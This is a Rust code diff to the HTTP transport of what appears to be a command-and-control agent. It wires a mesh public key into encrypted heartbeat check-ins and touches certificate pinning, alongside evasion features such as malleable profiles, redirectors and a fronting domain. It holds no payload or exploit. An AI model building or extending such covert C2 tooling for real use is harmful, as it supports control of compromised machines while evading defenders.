@@ -298,7 +298,7 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             // constant-time equality to prevent timing side-channel attacks
             // that could brute-force the expected fingerprint byte-by-byte.
             let expected_lower = expected.to_lowercase();
-            if !hex_fp.as_bytes().ct_eq(expected_lower.as_bytes()).into() {
+            if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
                 log::error!(
                     "cert pinning: fingerprint mismatch — rejecting connection"
                 );
@@ -460,7 +460,7 @@ fn extract_cn_minimal(der: &[u8]) -> Option<String> {
 }
 
 /// Find an extension by OID in the certificate.
-fn find_extension_minimal(der: &[u8], oid: &[u8]) -> Option<&[u8]> {
+fn find_extension_minimal<'a>(der: &'a [u8], oid: &[u8]) -> Option<&'a [u8]> {
     let mut p = enter_seq_min(der, 0)?;
     p = enter_seq_min(der, p)?;
     if der.get(p) == Some(&0xa0) { p = skip_tlv_min(der, p)?; }
@@ -550,6 +550,8 @@ pub struct HttpTransport {
     client: reqwest::Client,
     session: CryptoSession,
     agent_id: String,
+    /// Optional mesh public key attached to heartbeat-style checkins.
+    mesh_public_key: Option<[u8; 32]>,
     /// Round-robin index for http_get URI rotation.
     get_uri_idx: AtomicUsize,
     /// Round-robin index for http_post URI rotation.
@@ -587,6 +589,7 @@ impl HttpTransport {
         profile: Option<&AgentMalleableProfile>,
         session: CryptoSession,
         agent_id: String,
+        mesh_public_key: Option<[u8; 32]>,
         common_profile: Option<&common::config::MalleableProfile>,
         redirectors: Vec<RedirectorConfig>,
         front_domain: Option<String>,
@@ -707,6 +710,7 @@ impl HttpTransport {
             client,
             session,
             agent_id,
+            mesh_public_key,
             get_uri_idx: AtomicUsize::new(0),
             post_uri_idx: AtomicUsize::new(0),
             consecutive_failures: AtomicUsize::new(0),
@@ -1293,7 +1297,7 @@ impl Transport for HttpTransport {
                 .as_secs(),
             agent_id: self.agent_id.clone(),
             status: "idle".to_string(),
-            mesh_public_key: None, // TODO: wire mesh keypair into HttpTransport
+            mesh_public_key: self.mesh_public_key,
         };
         let serialized = bincode::serialize(&heartbeat)?;
         let ciphertext = self.session.encrypt(&serialized);
@@ -1363,7 +1367,7 @@ impl Transport for HttpTransport {
                     .as_secs(),
                 agent_id: self.agent_id.clone(),
                 status: "idle".to_string(),
-                mesh_public_key: None, // TODO: wire mesh keypair into HttpTransport
+                mesh_public_key: self.mesh_public_key,
             });
         }
 
@@ -1643,6 +1647,7 @@ mod tests {
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
             agent_id: "test-agent".to_string(),
+            mesh_public_key: None,
             get_uri_idx: AtomicUsize::new(0),
             post_uri_idx: AtomicUsize::new(0),
             consecutive_failures: AtomicUsize::new(0),
@@ -1716,6 +1721,7 @@ mod tests {
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-uri-append-test"),
             agent_id: "test-agent-id".to_string(),
+            mesh_public_key: None,
             get_uri_idx: AtomicUsize::new(0),
             post_uri_idx: AtomicUsize::new(0),
             consecutive_failures: AtomicUsize::new(0),
